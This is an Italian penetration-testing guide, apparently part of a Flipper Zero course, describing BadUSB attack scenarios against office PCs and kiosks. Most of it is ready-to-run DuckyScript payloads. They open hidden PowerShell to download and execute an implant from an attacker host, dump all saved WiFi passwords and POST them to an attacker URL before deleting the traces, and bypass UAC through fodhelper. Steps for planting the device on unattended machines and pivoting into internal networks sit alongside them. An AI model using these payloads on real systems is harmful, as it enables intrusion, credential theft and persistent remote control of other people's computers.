## Scenari di Penetration Testing

### Scenario 1 - Drop Attack durante Physical Pentest

**Obiettivo:** ottenere accesso remoto a un PC aziendale

**Preparazione:**
1. Scrivi un payload che installa una reverse shell persistente
2. Configura un server C2 (es. Sliver, Cobalt Strike, Havoc)
3. Genera il payload PowerShell per il C2
4. Crea lo script BadUSB che scarica e esegue il payload
5. Testa su un PC con lo stesso OS e configurazione del target

**Esecuzione:**
1. Durante il physical pentest, accedi all'area uffici
2. Identifica un PC sbloccato e non presidiato (break, riunione, bagno)
3. Collega il Flipper via USB
4. Avvia il payload → esecuzione in 5-10 secondi
5. Scollega il Flipper e allontanati
6. Verifica la connessione al C2 dal tuo setup esterno

**Payload di esempio (PowerShell reverse shell - educational):**
```
REM Reverse Shell Windows - Educational PoC
REM Layout: IT
DEFAULT_DELAY 100

REM Apri PowerShell minimizzato
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

REM Scarica ed esegui il payload del C2
STRING $c=New-Object Net.WebClient;$c.DownloadFile('http://ATTACKER/implant.exe','C:\Users\Public\svc.exe');Start-Process 'C:\Users\Public\svc.exe'
ENTER
DELAY 500

REM Chiudi la finestra
STRING exit
ENTER
```

### Scenario 2 - Exfiltration Credenziali WiFi

**Obiettivo:** estrarre tutte le password WiFi salvate su un PC target

**Payload:**
```
REM WiFi Password Exfiltration - Educational PoC
DEFAULT_DELAY 100

GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000

STRING $r='';(netsh wlan show profiles)|Select-String 'Profilo\s+:(.+)' -AllMatches|%{$n=$_.Matches.Groups[1].Value.Trim();$k=((netsh wlan show profile name=$n key=clear)|Select-String 'Contenuto\s+:(.+)');if($k){$r+="$n : $($k.Matches.Groups[1].Value.Trim())`n"}};$r|Out-File $env:TEMP\w.txt
ENTER
DELAY 2000

REM Invio al server (o salvataggio su Flipper via mass storage)
STRING Invoke-WebRequest -Uri http://ATTACKER/collect -Method POST -Body (Get-Content $env:TEMP\w.txt -Raw)
ENTER
STRING del $env:TEMP\w.txt
ENTER
STRING exit
ENTER
```

### Scenario 3 - Privilege Escalation via BadUSB

**Obiettivo:** da utente standard a admin locale

**Tecnica 1 - UAC Bypass (se utente è in Administrators ma UAC è attivo):**
```
REM UAC Bypass via fodhelper
DEFAULT_DELAY 100
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1000
STRING New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
ENTER
DELAY 200
STRING Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(Default)" -Value "cmd /c start powershell" -Force
ENTER
DELAY 200
STRING Start-Process fodhelper.exe
ENTER
```

**Tecnica 2 - Se non è in Administrators:**
- Sfruttare CVE noti per il kernel/OS target
- Cercare credenziali admin in file locali, registri, script
- Tentare exploit del servizio (se disponibili)

### Scenario 4 - Kiosk Escape + Network Pivot

**Obiettivo:** ottenere accesso alla rete interna da un terminale kiosk

1. Usa il payload Kiosk Evasion per uscire dalla modalità kiosk
2. Una volta ottenuto accesso al desktop/shell:
   - Identifica la configurazione di rete (ipconfig, ifconfig)
   - Scarica strumenti di pivot (chisel, ligolo)
   - Stabilisci tunnel verso l'esterno
3. Da li', pivota nella rete interna per ulteriori attacchi

---

## Cross-Reference - Scenari Multi-Vettore

| Scenario | Modulo Correlato | Link | Come si collegano |
|----------|-----------------|------|-------------------|
| Drop attack + NFC | NFC | [05-Scenari-Reali](../NFC/05-Scenari-Reali.md) | Badge NFC clonato per accesso fisico → drop BadUSB su workstation |
| Drop attack + RFID | RFID | [05-Scenari-Reali](../RFID/05-Scenari-Reali.md) | Badge RFID per accesso → BadUSB payload su PC dell'ufficio |
| Kiosk escape + WiFi | WiFi-Marauder | [05-Scenari-Reali](../WiFi-Marauder/05-Scenari-Reali.md) | BadUSB escape dal kiosk → ESP32 per ricognizione/pivot WiFi |
| Exfiltration + BLE | Bluetooth | [05-Scenari-Reali](../Bluetooth/05-Scenari-Reali.md) | BadUSB raccoglie dati → exfiltration via BLE al Flipper (no rete) |
| Drop + Sub-GHz | Sub-GHz | [05-Scenari-Reali](../Sub-GHz/05-Scenari-Reali.md) | Sub-GHz per accesso al perimetro → BadUSB all'interno |
| Drop + NRF24 | GPIO/NRF24 | [04-Scenari-Reali](../GPIO/NRF24/04-Scenari-Reali.md) | MouseJacker come alternativa wireless al BadUSB cablato |

